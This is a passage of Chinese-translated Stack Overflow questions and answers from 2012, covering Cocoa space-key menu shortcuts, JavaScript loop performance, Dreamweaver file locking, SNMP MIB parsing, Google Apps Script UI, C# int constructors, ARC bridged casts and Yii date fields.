我想访问一个网页并查看我的所有项目文件，如下所示：

```
\path
 \file1 local version: 4711 latest version in svn 5110 (update with a link)
 \file2 local version: 4711 latest version in svn 4711
.. 
```

现在，我会`svn up`更新我的所有文件或目录中的所有文件。但我并不总是想更新所有文件，我也不想`svn up file1 file2`

编辑：我在没有任何窗口管理器的服务器上使用 debian

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:35:16.910

通过 SVN 安装一些 GUI 例如，使用 TortoiseSVN，您可以

*   右键单击文件夹
*   选择“检查修改”
*   单击“检查存储库”
*   选择要更新的添加/删除/修改的文件
*   右键点击
*   选择“更新”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:31:15.033

尝试使用 SVN Monitor - [http://code.google.com/p/gs-lost-cause/](http://code.google.com/p/gs-lost-cause/) 这不是一个网络工具，但我认为这可能对你有帮助

# cocoa - NSMenuItem KeyEquivalent " "(空格) 错误

> ID：11155239
> 
> 赞同：11
> 
> 时间：2012-06-22T11:22:23.547
> 
> 标签：cocoa, keyboard-shortcuts, nsmenuitem

我想为 NSMenuItem （在应用程序主菜单中）设置等效键“”（空格），而不需要任何修饰符。

从文档如下：

> 例如，在播放媒体的应用程序中，播放命令可能只映射到“”（空格），而没有命令键。您可以使用以下代码执行此操作：
> 
> [menuItem setKeyEquivalent:@" "];
> 
> [menuItem setKeyEquivalentModifierMask:0];

等效键设置成功，但不起作用。当我在没有修饰符的情况下按“空格”键时，什么也没有发生，但是当我用“Fn”修饰键按“空格”时它会起作用。

我需要使用没有修饰符的“空格”。请提供任何帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-03T17:57:58.817

我有同样的问题。我没有认真调查，但据我所知，空格键“看起来”不像 Cocoa 的键盘快捷键，所以它被路由到`-insertText:`. 我的解决方案是对 NSWindow 进行子类化，在它沿着响应者链上升时将其捕获（假设您可以将 NSApp 子类化），然后将其显式发送到菜单系统：

```
- (void)insertText:(id)insertString
{
    if ([insertString isEqual:@" "]) {
        NSEvent *fakeEvent = [NSEvent keyEventWithType:NSKeyDown
                                              location:[self mouseLocationOutsideOfEventStream]
                                         modifierFlags:0
                                             timestamp:[[NSProcessInfo processInfo] systemUptime]
                                          windowNumber:self.windowNumber
                                               context:[NSGraphicsContext currentContext]
                                            characters:@" "
                           charactersIgnoringModifiers:@" "
                                             isARepeat:NO
                                               keyCode:49];
        [[NSApp mainMenu] performKeyEquivalent:fakeEvent];
    } else {
        [super insertText:insertString];
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2019-01-02T12:21:09.960

这是一个棘手的问题。就像许多答案所暗示的那样，在应用程序或窗口级别拦截事件是强制菜单项工作的可靠方法。同时它可能会破坏其他东西，例如，如果您有一个焦点`NSTextField`或者`NSButton`您希望他们消费事件，而不是菜单项。如果用户在系统首选项中重新定义该菜单项的等效键（即更改`Space`为`P`.

您使用与菜单项等效的空格键这一事实使事情变得更加棘手。空格是特殊的 UI 事件字符之一，与箭头键和其他一些字符一样，AppKit 会以不同的方式处理它们，并且在某些情况下会在它传播到主菜单之前消耗掉。

所以，有两件事要记住。首先，是标准的响应者链：

1.  `NSApplication.sendEvent`将事件发送到键窗口。
2.  按键窗口接收到事件`NSWindow.sendEvent`，判断是否为按键事件并`performKeyEquivalent`在自身上调用。
3.  `performKeyEquivalent`将其发送到当前窗口的`firstResponder`.
4.  如果响应者不使用它，则事件会递归地向上发送到`nextResponder`.
5.  `performKeyEquivalent``true`如果其中一个响应者消费了该事件，则返回，`false`否则。

现在，第二个也是棘手的部分，如果事件没有被消耗（即`performKeyEquivalent`返回时`false`），[窗口将尝试将其作为特殊的键盘 UI 事件进行处理——这在](https://i.stack.imgur.com/CfVUW.png)[Cocoa 事件处理指南](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/EventOverview/HandlingKeyEvents/HandlingKeyEvents.html)中有简要提及：

> Cocoa 事件调度架构将某些关键事件视为命令，以将控制焦点移动到窗口中的不同用户界面对象、模拟鼠标单击对象、关闭模式窗口以及在允许选择的对象中进行选择. 这种能力称为键盘界面控制。键盘界面控制中涉及的大多数用户界面对象都是 NSControl 对象，但不是控件的对象也可以参与。

这部分的工作方式非常简单：

1.  窗口[将按键事件转换为相应的操作](https://i.stack.imgur.com/AbpRV.png)（选择器）。
2.  它与第一响应者检查是否它`respondsToSelector`并调用它。
3.  如果调用了该操作，则该事件被视为已消耗，并且事件传播停止。

因此，考虑到所有这些，您必须确保两件事：

1.  响应者链已正确设置。
2.  响应者只消费他们需要的东西，否则传播事件。

第一点很少给人带来麻烦。第二个，这就是您的示例中发生的情况，需要注意 -`AVPlayer`通常是第一响应者并消耗空格键事件，以及其他一些事件。要完成这项工作，您需要重写`keyUp`和`keyDown`方法以将事件沿响应者链传播，就像在默认`NSView`实现中发生的那样。

```
// All player keyboard gestures are disabled.
override func keyDown(with event: NSEvent) {
    self.nextResponder?.keyDown(with: event)
}

// All player keyboard gestures are disabled.
override func keyUp(with event: NSEvent) {
    self.nextResponder?.keyUp(with: event)
} 
```

以上将事件向上转发到响应者链，最终将被主菜单接收。有一个问题，如果第一响应者是一个控件，`NSButton`或者任何自定义`NSControl`继承对象，它将**消耗**该事件。通常您确实希望发生这种情况，但如果不是，例如在实现自定义控件时，您可以覆盖`respondsToSelector`：

```
override func responds(to selector: Selector!) -> Bool {
    if selector == #selector(performClick(_:)) { return false }
    return super.responds(to: selector)
} 
```

这将阻止窗口消耗键盘 UI 事件，因此主菜单可以接收它。但是，如果您想拦截**所有**键盘 UI 事件，包括当第一响应者能够使用它时，您确实希望覆盖您的窗口或应用程序`performKeyEquivalent`，但不要像其他答案建议的那样复制它：

```
override func performKeyEquivalent(with event: NSEvent) -> Bool {
    // Attempt to perform the key equivalent on the main menu first.
    if NSApplication.shared.mainMenu?.performKeyEquivalent(with: event) == true { return true }
    // Continue with the standard implementation if it doesn't succeed.
    return super.performKeyEquivalent(with: event)
} 
```

如果您`performKeyEquivalent`在主菜单上调用而不检查结果，您可能最终会调用它两次——第一次是手动调用，第二次是从`super`实现中自动调用，如果事件没有被响应程序链消耗。当`AVPlayer`第一响应者和`keyDown`和`keyUp`方法未被覆盖时，就会出现这种情况。

PS Snippets 是 Swift 4，但想法是一样的！✌️

PPS 有一个精彩的[WWDC 2010 Session 145 – Cocoa 应用程序中的关键事件处理，](https://download.developer.apple.com/videos/wwdc_2010__hd/session_145__key_event_handling_in_cocoa_applications.mov)它通过出色的示例深入介绍了这个主题。WWDC 2010-11 不再在 Apple Developer Portal 上列出，但可以在[此处](https://meta.stackoverflow.com/a/387544/458356)找到完整的会议列表。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T22:03:08.923

我刚刚遇到了同样的问题。

空格键等效项在我的应用程序中工作正常，而 NSMenuItem 的链接 IBAction 位于应用程序委托中。

如果我将 IBAction 移动到专用控制器中，它将失败。所有其他菜单项键等效项继续工作，但空格键不响应（使用修饰键可以，但未修改的 @" " 将不起作用）。

我尝试了各种解决方法，例如直接链接到控制器与通过响应者链链接，但无济于事。我尝试了代码方式：

```
[menuItem setKeyEquivalent:@" "];  
[menuItem setKeyEquivalentModifierMask:0]; 
```

和 Interface Builder 方式，行为是一样的

根据贾斯汀的回答，我已经尝试对 NSWindow 进行子类化，但到目前为止还没有让它发挥作用。

所以现在我已经放弃并将这个 IBAction 重新定位到它工作的 App Delegate。我不认为这是一个解决方案，只是凑合……也许这是一个错误，或者（更有可能）我只是不太了解事件消息传递和响应者链。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-08-27T10:13:01.447

发布这篇文章是因为我也需要使用空间，但这些解决方案都不适合我。

因此，[我将 NSApplication 子类](http://www.cocoawithlove.com/2009/01/demystifying-nsapplication-by.html)化并将`sendEvent:`选择器与[justin k 解决方案](https://stackoverflow.com/a/11800907/2764823)一起使用：

```
- (void)sendEvent:(NSEvent *)anEvent
{
    [super sendEvent:anEvent];
    switch ([anEvent type]) {
    case NSKeyDown:
        if (([anEvent keyCode] == 49) && (![anEvent isARepeat])) {

            NSPoint pt; pt.x = pt.y = 0;
            NSEvent *fakeEvent = [NSEvent keyEventWithType:NSKeyDown
                                                  location:pt
                                             modifierFlags:0
                                                 timestamp:[[NSProcessInfo processInfo] systemUptime]
                                              windowNumber: 0 // self.windowNumber
                                                   context:[NSGraphicsContext currentContext]
                                                characters:@" "
                               charactersIgnoringModifiers:@" "
                                                 isARepeat:NO
                                                   keyCode:49];
            [[NSApp mainMenu] performKeyEquivalent:fakeEvent];
        }
        break;

    default:
        break;
    }
} 
```

希望它会有所帮助

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-10-31T13:22:32.110

快速 Swift 4-5 方法：

**在视图控制器中：**

```
// Capture space and call main menu
override func keyDown(with event: NSEvent) {
    if event.keyCode == 49 && !event.isARepeat{
        NSApp.mainMenu?.performKeyEquivalent(with: event)
    }
    super.keyDown(with: event)
} 
```

# javascript - 加载大量数据时防止“停止运行脚本”

> ID：11155244
> 
> 赞同：1
> 
> 时间：2012-06-22T11:22:38.597
> 
> 标签：javascript, settimeout

我目前正在运行 2 个 for 循环，遍历 2 个对象数组并使用两个列表中出现的对象创建一个新数组。当列表变大时，我会收到“停止运行脚本”提示。

```
MineGlobals.receivedData = jQuery.parseJSON(MineGlobals.receivedDataRaw);
MineGlobals.nettStasjonsListe = new Array();

var len1 = MineGlobals.nsData.length;
var len2 = MineGlobals.receivedData.Nettstasjoner.length
for (var i = 0; i < len2; i++) {
        for (var j = 0; j < len1; j++) {
            if (MineGlobals.receivedData.Nettstasjoner[i].Id == MineGlobals.nsData[j].Id) {
                var obj = new nsObject();
                obj = MineGlobals.nsData[j];
                if (MineGlobals.nsData[j].Lg != 0 && MineGlobals.nsData[j].La != 0) {
                    MineGlobals.nettStasjonsListe.push(obj);    
                }
                break;
            }
        }
    } 
```

我尝试使用 setTimeout()，但无法让它工作......所以有什么想法吗？

**编辑**

因此，由于我是新用户，我无法回答自己的问题，但我设法找到了解决方案。我使用了关联数组（）。将最大的数组放入其中，以 ID 作为键，然后对其进行迭代以找到相同的 ID。

```
var associativeArray = {};
for (var i = 0; i < len1; i++) {
    associativeArray[MineGlobals.nsData[i].Id] = MineGlobals.nsData[i];
}

 for (var j = 0; j < len2; j++) {
    var obj = new nsObject();
    obj = associativeArray[MineGlobals.receivedData.Nettstasjoner[j].Id];
    if (obj != undefined) {
        if (obj.Lg != 0 && obj.La != 0) {
            if (obj == null || obj == "") {
                obj.Nvn = "Ikke definert";
            }
            if (obj.NisAdresse == null || obj.NisAdresse == "") {
                obj.NisAdresse = "Ikke definert";
            }
            MineGlobals.nettStasjonsListe.push(obj);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:33:11.947

可以`chunk`对数组进行处理，见以下[链接](http://www.mattsnider.com/javascript/handle-slow-processes-without-blocking-the-ui/)：

我围绕它编写了一个原型类，它解决了我的问题：

```
/**
 * provides UI update while using large arrays without blocking
 * found core idea on http://www.mattsnider.com/javascript/handle-slow-processes-without-blocking-the-ui/
 */
var ChunkedArray = Class.create(Enumerable, {
    initialize: function(options) {
        this.array = new Array();
        this.options = Object.extend({
            chunkSize: 20,
            interval: 10
        }, options || {})
    },

    push: function(obj) {
        this.array.push(obj)
    },

    chunk: function(array, index, length, iterator, context) {
        var j, l = array.length;
        for (j = (index + length); (index < j && index < l); index += 1) {
            iterator.call(context, array[index], index);
        }

        if (l > index) {
            setTimeout(function() {
                this.chunk(array, index, length, iterator, context);
            }.bind(this), this.options.interval);
        }
    },

    _each: function(iterator, context) {
        this.chunk(this.array, 0,
                this.options.chunkSize, iterator, context);
    },

    toString: function() {
        return this.array.toString();
    }
}); 
```

# version-control - DreamWeaver CS4：它使用哪种版本控制系统 (VCS)？

> ID：11155245
> 
> 赞同：3
> 
> 时间：2012-06-22T11:22:40.733
> 
> 标签：version-control, dreamweaver, perforce

在 DreamWeaver CS4 中，当我转到 Site -> New Site... 并浏览各个屏幕时，我进入一个名为 Site Definition -> Sharing Files 的屏幕，它询问我：

您是否要启用签入和签出文件，以确保您和您的同事不能同时编辑同一个文件？

如果我选择“是”，它会询问我的姓名和电子邮件地址， 似乎*没有别的。*

我想知道的是，使用什么版本控制系统（VCS）来实现这个屏幕上的选项？是DW专有的VCS系统，还是其他的。我知道 CS4 支持 Perforce，但不知道这个屏幕是否用于配置 Perforce 选项，那为什么没有提到呢？除了 P4（CVS、SVN、GIT、Mercurial (Hg) 等）之外，DW CS4 还支持哪些其他 VCS 系统？

感谢您分享您的知识，

约翰·戈切

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-22T14:21:57.783

对于您正在谈论的屏幕，基本的签入/签出功能不是版本控制系统，它是为了防止多人同时编辑同一个文件。它只是为您签出的文件添加一个 .lck 文件到服务器。如果使用 Dreamweaver 的其他人尝试打开文件（假设他们还打开了签入/签出），他们将无法编辑该文件（好吧，他们无论如何都可以编辑并根据需要覆盖锁定）。姓名和电子邮件地址仅用于向编辑网站的其他人提供该信息，他们可以查看谁签出了哪些文件。我认为您还可以搜索该站点以查看由特定人员签出的所有文件（“文件”面板选项菜单 { 面板右上角）-> 站点-> 显示签出者。

有关签入/签出的信息，请参阅此 PDF 的第 88 页，以及有关 Subversion 信息的第 91 页：[http](http://help.adobe.com/archive/en_US/dreamweaver/cs4/dreamweaver_cs4_help.pdf) : //help.adobe.com/archive/en_US/dreamweaver/cs4/dreamweaver_cs4_help.pdf 此处有关 SVN 和 Dreamweaver 的其他帮助： [http://helpx.adobe.com/dreamweaver/kb/subversion-resources-dreamweaver-cs4-cs5.html](http://helpx.adobe.com/dreamweaver/kb/subversion-resources-dreamweaver-cs4-cs5.html)

编辑：还有一个使用 GIT 的扩展：[https ://github.com/ChrisMcKee/gitweaver](https://github.com/ChrisMcKee/gitweaver)

如果您使用外部版本控制客户端，您当然可以在站点上使用您想要的任何版本控制。我已经这样做了多年，而且效果很好，因为您不必依赖单独的编辑应用程序来支持版本控制。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T14:20:27.597

通过 P4GT 插件支持 Perforce：[http ://www.perforce.com/product/components/perforce_plugin_graphical_tools](http://www.perforce.com/product/components/perforce_plugin_graphical_tools)

# snmp - 预期的“（”（_）：在 /usr/share/snmp/mibs/ZYXEL-ES2108G-MIB.txt 中的第 939 行

> ID：11155255
> 
> 赞同：1
> 
> 时间：2012-06-22T11:23:38.857
> 
> 标签：snmp, net-snmp, mib

运行 snmptranslate -IR sysSwYear 时出错

***预期的 "(" (_): 在 /usr/share/snmp/mibs/ZYXEL-ES2108G-MIB.txt 的第 939 行 应该是 ACCESS (to): 在 /usr/share/snmp/mibs/ZYXEL 的第 939 行-ES2108G-MIB.txt OBJECT-TYPE 解析错误：/usr/share/snmp/mibs/ZYXEL-ES2108G-MIB.txt 中的第 939 行未知对象标识符：sysSwYear....***

这是什么原因？？？请帮帮我

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-30T12:45:35.517

将“_”替换为“-”就可以了：D

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-07-08T18:02:29.700

使用 -Pu 标志。

-Pu 切换是否允许在 MIB 对象名称和其他符号中使用下划线字符。严格来说，这不是有效的 SMI 语法，但某些供应商 MIB 文件定义了此类名称。也可以使用配置标记 mibAllowUnderline 设置默认行为。

# google-apps-script - Google App Script WebApp，操作 UI

> ID：11155259
> 
> 赞同：0
> 
> 时间：2012-06-22T11:23:55.300
> 
> 标签：google-apps-script, google-apps

嗨，大家好，

Google App Script 可以以多种方式使用。我知道因为我已经尝试过其中一些，但我不是专家，所以情况是这样。

我创建了一个电子表格，使用脚本编辑器附带的新 UI Building 创建一个表单。命名：gtest01
UI 组成：

*   标签，id=label_caption
*   按钮 1，id=button_hide，event-onmouseclick=hide_label
*   按钮 2，id=button_show，event-onmouseclick=show_label
*   按钮 3，id=button_message，event-onmouseclick=message_me

现在，代码是：

```
/* This is so when I want to just deploy it as a [webapp] using the
script editor -> Publish Deploy as Web App
*/
function doGet(e) {
 var app = UiApp.createApplication().setTitle("Sheet Application");
  app.add(app.loadComponent("gtest01"));
  Logger.log("Application UI Loaded");  
  return app;
}

function message_me(e) {  
  Browser.msgBox("my message"); 
}

function hide_label(e) {
  var app = UiApp.getActiveApplication();
  label =app.getElementById("label_caption");
  label.setVisible(false);
}

function show_label(e) {
  var app = UiApp.getActiveApplication();
  label =app.getElementById("label_caption");
  label.setVisible(true);
}

// this code is for when the spreadsheet is shared so they can access the form
function showform_() {
  var app = UiApp.createApplication();
  app.add(app.loadComponent("gtest01"));
  SpreadsheetApp.getActiveSpreadsheet().show(app); 
}

function onOpen() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var menuEntries = [];
  menuEntries.push({name: "Show Form", functionName: "showform_"});
  ss.addMenu("e-Test", menuEntries);
} 
```

第一种情况是共享电子表格时

*   单击菜单时，表单将加载-很好
*   当显示和隐藏按钮没有任何反应 - 为什么以及如何解决这个问题？
*   单击消息按钮时-消息将显示但表单将关闭，如何在不关闭表单的情况下显示消息？

第二种情况是作为 Webapp 发布时。

*   当开发者链接访问时，UI 总是更新 - 好的
*   当 URL 链接访问时，UI 总是像缓存一样更新，我该如何解决这个问题？
*   在开发链接上：当显示和隐藏按钮没有任何反应时 - 为什么以及如何解决这个问题？
*   在开发链接上：单击消息按钮时 - 将生成错误，如何在 WebApp 上显示警报消息

请帮助我搜索并尝试了论坛中的示例代码和答案，我遗漏了一些东西。

谢谢

尼克·艾斯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:38:04.697

显示和隐藏按钮没有任何反应的第一个场景 - 为什么以及如何解决这个问题？

在您的函数中，最后使用 return app。除非您返回 app 对象，否则 UI 不会更新。

如何在不关闭表单的情况下显示消息？- 尝试 `SpreadsheetApp.getActiveSpreadsheet().toast()`

第二种情况

当 URL 链接访问时，UI 总是像缓存一样更新，我该如何解决这个问题？- 将您最近的代码另存为版本

在开发链接上：当显示和隐藏按钮没有任何反应 - 再次返回应用程序将处理这个问题

在开发链接上：单击消息按钮时... - Web 应用程序不支持 Browser.msgBox。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T12:21:15.677

使用 UI 时，最好让所有事情都发生在这个 Ui 中，所以尽量避免使用 Toast 显示消息（因为它们在 Web 应用程序中不受支持）。由于您使用的是 GUI，因此在消息中使用最初不可见的标签并使其在处理程序例程中可见应该很容易。请注意，这种处理程序也可以是客户端处理程序，除非您需要从此操作执行其他操作。

至于你的其他问题，我们（非常快的）朋友斯里克已经彻底回答了;-)

# ruby-on-rails - 即使给出了主机名和数据库，rails 也无法连接到 globale 数据库服务器

> ID：11155261
> 
> 赞同：0
> 
> 时间：2012-06-22T11:23:59.190
> 
> 标签：ruby-on-rails

在我的铁路应用程序中，
在 database.yml 文件中，我给出了所有字段，例如主机、数据库、用户名、密码等。但它没有连接到服务器（这里我正在尝试连接全局数据库）

它给出了一个错误“用户'myappdemo'@'142.25.12.1'的访问被拒绝（使用密码：是）”

当我尝试连接我的本地主机时，如果主机被指定为“127.0.0.1”，即主机是一个IP地址..但不是“localhost”

# c# - 按照设计，为什么 int 没有单个参数 ctor？

> ID：11155268
> 
> 赞同：3
> 
> 时间：2012-06-22T11:24:33.980
> 
> 标签：c#

```
using System;

namespace FirstApplication
{
    class Program
    {
        static void Main(params string[] args)
        {
            int x = new int();
            x = 12;
            //int y = new int(12);
            Console.WriteLine(x);
        }
    }
} 
```

按照设计，为什么没有一个参数 ctor`int`可以`x`设置为 12 而不必先设置为 0？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-22T11:28:04.657

原因在于CLR本身。CLR 不将`Int32`其视为任何普通结构。它有一个特殊的存储类型`int`，它不是 CLR 对象。这意味着它不需要构造函数，就像`int`C 中的 an 没有构造函数一样。

此外，结构默认构造函数的 CLR 处理是将所有字段设置为其默认值。对于 int，这是 0。`new int()`似乎是一种特殊情况，只是作为 0 的“别名”，完全消除了任何构造函数。

另外，这只是更好。

```
int x = 12; 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-22T11:26:28.447

这是不必要的 - 我更喜欢：

```
int x = 12; 
```

至

```
int x = new int(12); 
```

提供了无参数构造函数，因为`int`它是一个`struct`，我从未见过任何实际显式使用它的生产代码。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-22T16:05:09.717

[规范](http://www.jaggersoft.com/csharp_standard/18.3.8.htm)没有要求

> 结构**可以**声明具有参数的实例构造函数。

这*不是* **必须**的；因此，提供带参数的构造函数完全是可选的。设计师选择不这样做，所以给他们更多的权力;-)

**还有什么其他原因？**

**简化设计？**

让我们想象一下，框架设计者决定提供一个构造函数：

```
int myInt = new int(99999999999999999999999999999999999); 
```

构造函数的复杂性现在增加了。为避免溢出错误，需要检查所提供值的范围。

所以简化也是反对提供构造函数的论据。

[该规范还定义了“ simple-types](http://www.jaggersoft.com/csharp_standard/11.1.htm#simple-type) ”的默认值。对于 int，[它是 0](http://www.jaggersoft.com/csharp_standard/11.1.1.htm)。正如@KendallFrey 所提到的，有可能对整数的实例化进行了优化，但是，它们确实**有**一个构造函数——一个将值初始化为 0 的隐式默认构造函数。 IIRC（我会看看我是否可以挖掘它稍后出），简单类型实际上是由内存管理器实例化的。此处的其他构造函数逻辑也可能使问题复杂化。

**执行语义？**

正如@rich.okelly 提到的， int x = 12; 看起来不错；这样做的原因是因为我们经常将值类型语义理解为包括直接分配值。对我来说，引用类型赋值 var x = new RefType(); 一直推断分配和分配发生了不同的过程；新手用户可能会期望：

```
int x = new int(12); 
```

和

```
XmlDocument x = new XmlDocument(); 
```

在某种程度上是等价的。

笔记：

我真的不相信这是一个除了在框架中实现它的任何人之外的任何人都可以回答的问题。

# ios - ARC下指向Objective-C对象的C样式指针数组

> ID：11155275
> 
> 赞同：10
> 
> 时间：2012-06-22T11:25:10.140
> 
> 标签：ios, malloc, automatic-ref-counting, arrays

我有一个指向 Objective-C 实例的 2D 指针数组，以跟踪地图网格上的游戏对象。现在我正在将我的代码转换为 ARC，Xcode 指出了错误。我知道不允许将指向对象的指针作为结构成员，但是这个让我（几乎）措手不及。

我理解 ARC 约束背后的基本原理，但是：

1.  在网格中查找对象时，我无法承受 Objective-C 数组的开销，并且

2.  对象本身已经由`NSArray`定义在同一类中的 ivar 拥有，该类将 C 样式网格作为 ivar；c 风格的数组只是一种结构方便的快捷方式。此外，当从拥有的对象中删除对象时`NSArray`，我将相应的网格槽设置为`NULL`。

也就是说，二维数组（网格）只是快速（但愚蠢）指针的集合，指向安全地保留在其他地方（`NSArray`ivar）的对象。

有没有办法使用演员来摆脱这种情况？例如，将我的网格定义和分配为：

```
void*** _grid; 
```

代替

```
MyMapObjectClass*** _grid 
```

并在设置或获取每个插槽中的指针时在`void*`<->之间使用（适当桥接）强制转换？`MyMapObjectClass*`

**编辑**：所以这就是我解决它的方法

我如上所述更改了 ivar 声明。此外，在设置我的查找网格的条目时，我这样做了：

```
// (Done **Only Once** at map initialization) 
// _objectArray is an instance of NSMutableArray

MyMapObjectClass* mapObject = [[MyMapObjectClass alloc] init];

// ...configure map object, etc...

// Add to Obj-C array:
[_objectArray addObject:mapObject];

// Add pointer to 2D C array:
_grid[i][j] = (__bridge void*)mapObject; 
```

当访问 (x,y) 处的对象时，我会做相反的事情：

```
MyMapObjectClass* object = (__bridge MyMapObjectClass*) _grid[x][y];

[object performSomeMethod];

// etc... 
```

从地图中删除对象时，我这样做：

```
MyMapObjectClass* object = (__bridge MyMapObjectClass*) _grid[x][y];

[_objectArray removeObject:object];

_grid[x][y] = NULL; 
```

地图对象在游戏开始时创建一次，并根据游戏进度移除。如果我需要**替换**另一个地图对象，我会这样做：

```
MyMapObjectClass* oldObject = (__bridge MyMapObjectClass*) _grid[x][y];
// (should mark as weak?)

[_objectArray removeObject:oldObject];    
_grid[x][y] = NULL;

MyMapObjectClass* newObject = [[MyMapObjectClass alloc] init];

[_objectArray addObject:newObject];

_grid[x][y] = (__bridge void*)newObject; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T12:21:50.383

使用强制转换来规避 ARC 通常是个坏主意。更好的方法是为您的 map.m[禁用 ARC](https://stackoverflow.com/questions/6646052/how-can-i-disable-arc-for-a-single-file-in-a-project)`retain` （或将查找部分分解为单独的类）。然后使用/`release`和您喜欢的 C 结构在其中进行手动内存管理，只要您正确执行它会正常工作，您将能够从其他类调用它，避免嵌套`NSArrays`等的开销。

# php - 不在单个模型中存储两个日期字段

> ID：11155277
> 
> 赞同：0
> 
> 时间：2012-06-22T11:25:18.577
> 
> 标签：php, mysql, yii

我是新手`Yii Framework`。我有一个`model called invoice`。在那个模型中，属性就像 `invoice_title,invoice_issue_date,due_date,description`。现在我的问题是，由于我的模型同时具有 invoice_issue_date 和 due_date 都是日期字段，但只有一个存储日期，另一个只是存储它。这`0000-00-00`是我的模型的代码。

```
<?php

/**
 * This is the model class for table "{{invoices}}".
 *
 * The followings are the available columns in table '{{invoices}}':
 * @property integer $id
 * @property integer $customer_id
 * @property integer $payment_id
 * @property string $invoice_title
 * @property string $invoice_issue_date
 * @property string $due_date
 * @property string $description
 */
class Invoices extends CActiveRecord
{
  /**
   * Returns the static model of the specified AR class.
   * @param string $className active record class name.
   * @return Invoices the static model class
   */
  public static function model($className=__CLASS__)
  {
    return parent::model($className);
  }

  /**
   * @return string the associated database table name
   */
  public function tableName()
  {
    return '{{invoices}}';
  }

  /**
   * @return array validation rules for model attributes.
   */
  public function rules()
  {
    // NOTE: you should only define rules for those attributes that
    // will receive user inputs.
    return array(
      array('invoice_title, invoice_issue_date,due_date', 'required'),
      array('invoice_title','length','min'=>6),
      array('invoice_title,description', 'length', 'max'=>120),
      // The following rule is used by search().
      // Please remove those attributes that should not be searched.
      array('id, invoice_title, invoice_issue_date, due_date, description', 'safe', 'on'=>'search'),
    );

  }

  /**
   * @return array relational rules.
   */
  public function relations()
  {
    // NOTE: you may need to adjust the relation name and the related
    // class name for the relations automatically generated below.
    return array(

    );
  }

  protected function afterFind(){
    parent::afterFind();
    $this->due_date=date('d F, Y', strtotime(str_replace("-", "", $this->due_date)));
  }

  protected function beforeSave(){
    if(parent::beforeSave()){
        $this->due_date=date('Y-m-d', strtotime(str_replace(",", "", $this->due_date)));
        return TRUE;
    }
    else return false;
  }

  /**
   * @return array customized attribute labels (name=>label)
   */
  public function attributeLabels()
  {
    return array(
      'id' => 'ID',
      'invoice_title' => 'Invoice Title',
      'invoice_issue_date' => 'Invoice Issue Date',
      'due_date' => 'Due Date',
      'description' => 'Description',
    );
  }

  /**
   * Retrieves a list of models based on the current search/filter conditions.
   * @return CActiveDataProvider the data provider that can return the models based on the search/filter conditions.
   */
  public function search()
  {
    // Warning: Please modify the following code to remove attributes that
    // should not be searched.

    $criteria=new CDbCriteria;

    $criteria->compare('id',$this->id);
    $criteria->compare('invoice_title',$this->invoice_title,true);
    $criteria->compare('invoice_issue_date',$this->invoice_issue_date,true);
    $criteria->compare('due_date',$this->due_date,true);
    $criteria->compare('description',$this->description,true);

    return new CActiveDataProvider($this, array(
      'criteria'=>$criteria,
    ));
  }
} 
```

查看文件的代码

```
<div class="form">

<?php $form=$this->beginWidget('CActiveForm', array(
  'id'=>'invoices-form',
  'enableAjaxValidation'=>false,
)); ?>

  <p class="note">Fields with <span class="required">*</span> are required.</p>

  <?php echo $form->errorSummary($model); ?>

  <div class="row">
    <?php echo $form->labelEx($model,'invoice_title'); ?>
    <?php echo $form->textField($model,'invoice_title',array('size'=>45,'maxlength'=>45)); ?>
    <?php echo $form->error($model,'invoice_title'); ?>
  </div>

    <div class="row">
      <?php echo $form->labelEx($model,'invoice_issue_date'); ?>
      <?php 
      $this->widget('zii.widgets.jui.CJuiDatePicker',
      array(
            'attribute'=>'invoice_issue_date',
            'model'=>$model,
            'options' => array(
                              'mode'=>'focus',
                              'dateFormat'=>'d MM, yy',
                              'showAnim' => 'slideDown',
                              ),
      'htmlOptions'=>array('size'=>30,'class'=>'date'),
          )
      );
      ?>
      <?php echo $form->error($model,'invoice_issue_date'); ?>
    </div>

    <div class="row">
      <?php echo $form->labelEx($model,'due_date'); ?>
      <?php 
      $this->widget('zii.widgets.jui.CJuiDatePicker',
      array(
            'attribute'=>'due_date',
            'model'=>$model,
            'options' => array(
                              'mode'=>'focus',
                              'dateFormat'=>'d MM, yy',
                              'showAnim' => 'slideDown',
                              ),
      'htmlOptions'=>array('size'=>30,'class'=>'date'),
          )
      );
      ?>
      <?php echo $form->error($model,'due_date'); ?>
    </div>

  <div class="row">
    <?php echo $form->labelEx($model,'description'); ?>
    <?php echo $form->textArea($model,'description',array('rows'=>6, 'cols'=>50)); ?>
    <?php echo $form->error($model,'description'); ?>
  </div>

  <div class="row buttons">
    <?php echo CHtml::submitButton($model->isNewRecord ? 'Create' : 'Save'); ?>
  </div>

<?php $this->endWidget(); ?>

</div><!-- form --> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:30:44.710

这是从 yii 开始的一个非常常见的错误：P 将 'dueDate' 添加到您的规则数组中：

```
array('dueDate', 'safe'), 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T18:12:22.377

在我的模型中，我做出了改变`afterFind()`并`beforeSave()`喜欢这样

```
 protected function afterFind(){
    parent::afterFind();
    $this->due_date=date('d F, Y', strtotime(str_replace("-", "", $this->due_date)));
    $this->invoice_issue_date=date('d F, Y', strtotime(str_replace("-", "", $this->invoice_issue_date)));
  }

  protected function beforeSave(){
    if(parent::beforeSave()){
